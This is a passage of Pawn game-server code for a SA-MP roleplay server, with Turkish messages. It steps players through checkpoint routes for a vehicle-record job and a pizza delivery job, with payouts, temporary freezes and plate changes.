	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2879.3933,-528.8597,13.7914, 7.5);
			SicilTCheckpoint[playerid] = 18;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 18)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2789.0107,-410.3373,22.4367, 7.5);
			SicilTCheckpoint[playerid] = 19;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 19)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2731.1321,-241.8697,28.3068, 7.5);
			SicilTCheckpoint[playerid] = 20;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 20)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2768.9331,-103.0160,34.9829, 7.5);
			SicilTCheckpoint[playerid] = 21;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 21)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2773.7292,62.0462,29.8560, 7.5);
			SicilTCheckpoint[playerid] = 22;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 22)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2775.8623,175.9799,20.1383, 7.5);
			SicilTCheckpoint[playerid] = 23;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 23)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2721.0295,290.3000,20.0969, 7.5);
			SicilTCheckpoint[playerid] = 24;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 24)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2584.4714,319.0340,27.7967, 7.5);
			SicilTCheckpoint[playerid] = 25;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 25)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2464.9307,324.6331,31.5980, 7.5);
			SicilTCheckpoint[playerid] = 26;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 26)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2344.8938,326.9948,32.4920, 7.5);
			SicilTCheckpoint[playerid] = 27;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 26)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2231.0393,324.7633,32.4985, 7.5);
			SicilTCheckpoint[playerid] = 27;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 27)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2039.8910,316.7744,34.5188, 7.5);
			SicilTCheckpoint[playerid] = 28;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 28)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1874.8311,291.0024,27.3847, 7.5);
			SicilTCheckpoint[playerid] = 29;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 29)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1751.9292,285.7075,17.9902, 7.5);
			SicilTCheckpoint[playerid] = 30;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 30)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1723.2402,443.6505,30.7118, 7.5);
			SicilTCheckpoint[playerid] = 31;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 31)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1760.9760,551.3229,25.7073, 7.5);
			SicilTCheckpoint[playerid] = 32;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 32)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1805.7155,813.8959,10.6959, 7.5);
			SicilTCheckpoint[playerid] = 33;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 33)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1806.4573,1090.1121,6.5658, 7.5);
			SicilTCheckpoint[playerid] = 34;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 34)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1806.4677,1400.9362,6.5697, 7.5);
			SicilTCheckpoint[playerid] = 35;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 35)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1806.2053,1705.3361,6.5696, 7.5);
			SicilTCheckpoint[playerid] = 37;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 37)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1806.5676,1962.1332,5.2205, 7.5);
			SicilTCheckpoint[playerid] = 38;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 38)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1806.5854,2283.2422,5.4028, 7.5);
			SicilTCheckpoint[playerid] = 39;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 39)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1815.6494,2424.3586,10.8733, 7.5);
			SicilTCheckpoint[playerid] = 40;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 40)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1725.5627,2554.5630,11.0738, 7.5);
			SicilTCheckpoint[playerid] = 41;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 41)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1599.5905,2500.4915,7.6826, 7.5);
			SicilTCheckpoint[playerid] = 42;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 42)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1599.5889,2455.3523,6.6620, 7.5);
			SicilTCheckpoint[playerid] = 43;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 43)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1728.0671,2469.0891,6.6669, 7.5);
			SicilTCheckpoint[playerid] = 44;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 44)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1906.1034,2512.7454,6.6363, 7.5);
			SicilTCheckpoint[playerid] = 45;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 45)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2094.3743,2567.8633,6.6164, 7.5);
			SicilTCheckpoint[playerid] = 46;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 46)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2302.3945,2610.1038,6.5807, 7.5);
			SicilTCheckpoint[playerid] = 47;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 47)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2485.0540,2598.7202,4.9442, 7.5);
			SicilTCheckpoint[playerid] = 48;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 48)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2478.7078,2626.8035,5.3062, 7.5);
			SicilTCheckpoint[playerid] = 49;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 49)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2427.1506,2664.6230,10.6481, 7.5);
			SicilTCheckpoint[playerid] = 50;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 50)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2363.6912,2715.3340,10.5032, 7.5);
			SicilTCheckpoint[playerid] = 51;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 51)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2350.7231,2762.2173,10.6518, 7.5);
			SicilTCheckpoint[playerid] = 52;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 52)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			SicilTCheckpoint[playerid] = 94;
			DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 4500, 0, "i", playerid);
			Bilgi(playerid, "5 saniye sonra devam edebileceksiniz.");
			SetPlayerCheckpoint(playerid, 2190.7151,-1988.7257,13.5469, 4.5);
	    }
	}
	else if(SicilTCheckpoint[playerid] == 53)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2348.8582,2725.9580,10.6517, 7.5);
			SicilTCheckpoint[playerid] = 54;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 54)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2306.9485,2630.3679,6.5835, 7.5);
			SicilTCheckpoint[playerid] = 55;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 55)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2021.4686,2565.7227,6.6237, 7.5);
			SicilTCheckpoint[playerid] = 56;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 56)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1750.2073,2491.7085,6.6600, 7.5);
			SicilTCheckpoint[playerid] = 57;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 57)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1587.3425,2460.7725,6.5998, 7.5);
			SicilTCheckpoint[playerid] = 58;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 58)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1701.8160,2436.8108,6.6073, 7.5);
			SicilTCheckpoint[playerid] = 59;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 59)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1788.5809,2287.9675,5.4826, 7.5);
			SicilTCheckpoint[playerid] = 60;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 60)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1788.3220,2082.1111,3.7377, 7.5);
			SicilTCheckpoint[playerid] = 61;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 61)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1787.9442,1898.9717,6.3836, 7.5);
			SicilTCheckpoint[playerid] = 62;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 62)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1788.5101,1641.8850,6.5658, 7.5);
			SicilTCheckpoint[playerid] = 63;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 63)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1788.2135,1475.6071,6.5696, 7.5);
			SicilTCheckpoint[playerid] = 64;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 64)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1788.2435,1248.4648,6.5653, 7.5);
			SicilTCheckpoint[playerid] = 65;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 65)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1788.0549,1050.5498,6.5652, 7.5);
			SicilTCheckpoint[playerid] = 66;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 66)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1788.3680,869.3002,10.3077, 7.5);
			SicilTCheckpoint[playerid] = 67;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 67)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1754.4402,600.2859,22.5251, 7.5);
			SicilTCheckpoint[playerid] = 68;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 68)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1717.2860,498.2830,29.2979, 7.5);
			SicilTCheckpoint[playerid] = 69;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 69)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1702.7643,449.7150,30.7350, 7.5);
			SicilTCheckpoint[playerid] = 70;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 70)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1672.7513,358.5029,30.0472, 7.5);
			SicilTCheckpoint[playerid] = 71;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 71)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1610.5886,136.4297,36.2531, 7.5);
			SicilTCheckpoint[playerid] = 72;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 72)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1639.7810,-36.3227,36.4254, 7.5);
			SicilTCheckpoint[playerid] = 73;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 73)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1659.0704,-205.7387,36.0688, 7.5);
			SicilTCheckpoint[playerid] = 74;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 74)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1690.2297,-462.0522,32.9796, 7.5);
			SicilTCheckpoint[playerid] = 75;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 75)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1702.6630,-631.2142,40.4634, 7.5);
			SicilTCheckpoint[playerid] = 76;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 76)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1689.4794,-737.6799,50.5166, 7.5);
			SicilTCheckpoint[playerid] = 77;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 77)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1648.8590,-828.8683,58.1290, 7.5);
			SicilTCheckpoint[playerid] = 78;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 78)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1664.9949,-961.9037,30.2510, 7.5);
			SicilTCheckpoint[playerid] = 79;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 79)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1731.8621,-1033.0903,39.4455, 7.5);
			SicilTCheckpoint[playerid] = 80;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 80)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1877.7096,-1022.7554,35.9337, 7.5);
			SicilTCheckpoint[playerid] = 81;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 81)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 1973.1066,-1026.8446,33.9933, 7.5);
			SicilTCheckpoint[playerid] = 82;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 82)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2125.2793,-1083.7490,24.0285, 7.5);
			SicilTCheckpoint[playerid] = 83;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 83)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2221.3706,-1128.2507,25.4553, 7.5);
			SicilTCheckpoint[playerid] = 84;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 84)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2258.4619,-1145.3641,26.5529, 7.5);
			SicilTCheckpoint[playerid] = 85;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 85)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2270.6494,-1214.2849,23.5927, 7.5);
			SicilTCheckpoint[playerid] = 86;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 86)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2270.5933,-1366.8989,23.6595, 7.5);
			SicilTCheckpoint[playerid] = 87;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 87)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2221.2593,-1383.0415,23.6596, 7.5);
			SicilTCheckpoint[playerid] = 88;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 88)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2210.3552,-1456.0386,23.6493, 7.5);
			SicilTCheckpoint[playerid] = 89;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 89)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2209.9604,-1552.1650,23.6596, 7.5);
			SicilTCheckpoint[playerid] = 90;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 90)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2183.9136,-1715.1786,13.1662, 7.5);
			SicilTCheckpoint[playerid] = 91;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 91)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2210.4019,-1738.2026,13.2045, 7.5);
			SicilTCheckpoint[playerid] = 92;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 92)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2215.1150,-1829.3951,13.0268, 7.5);
			SicilTCheckpoint[playerid] = 93;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 93)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			DisablePlayerCheckpoint(playerid);
			SetPlayerCheckpoint(playerid, 2210.4021,-1963.5411,13.1470, 7.5);
			SicilTCheckpoint[playerid] = 94;
	    }
	}
	else if(SicilTCheckpoint[playerid] == 94)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 7 && !GetPlayerVehicleSeat(playerid))
	    {
			new vID = GetPlayerVehicleID(playerid);
			new Float:abooX, Float:abooY, Float:abooZ;
			GetPlayerPos(playerid, abooX, abooY, abooZ);
			MotoruKapat(vID);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 4500, 0, "i", playerid);
			RepairVehicleEx(vID);
			SicilTCheckpoint[playerid] = 0;
			SicilTGorevde[playerid] = 0;
			SetPlayerColor(playerid, COLOR_WHITE);
			new ucret=floatround(350*UstalikKatSayi(playerid));
			GivePlayerCash(playerid, ucret);
	        new plakakyd[128];
	        format(plakakyd, sizeof(plakakyd), "Aracýn sicili baþarýyla deðiþtirildi, %d$ kazandýnýz.", ucret);
	        Bilgi(playerid, plakakyd);
	        format(plakakyd, sizeof(plakakyd), "%s", RandomPlaka());
	        strmid(Arac[GetPlayerVehicleID(playerid)][aplaka], plakakyd, 0, strlen(plakakyd), 255);
	        RemovePlayerFromVehicle(playerid);
		    SetVehicleToRespawn(vID);
		    Aractamiri(vID);
	    }
	}
	if(PizzaCheckpoint[playerid] == 1)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 2;
		    DisablePlayerCheckpoint(playerid);
		    TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 2463.3755,-2013.4033,13.1607, 4.5);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 2)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 3;
		    DisablePlayerCheckpoint(playerid);
		    TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
		    SetPlayerCheckpoint(playerid, 2005.3914,-1641.6661,13.2377, 4.5);
			TogglePlayerControllable(playerid, 0);
		    GivePlayerCash(playerid, PizzaPara(playerid));
		}
	}
	else if(PizzaCheckpoint[playerid] == 3)
	{
	    if(Arac[GetPlayerVehicleID(playerid)][atip] == 6 && !GetPlayerVehicleSeat(playerid) && PizzaGorevde[playerid] == 1)
		{
		    PizzaCheckpoint[playerid] = 4;
		    DisablePlayerCheckpoint(playerid);
			TogglePlayerControllable(playerid, 0);
			SetTimerEx("UnfreezeTimer", 15000, 0, "i", playerid);
			Bilgi(playerid, "Pizzayý teslim ediyorsunuz, bir süre sonra tekrar hareket edebileceksiniz.");
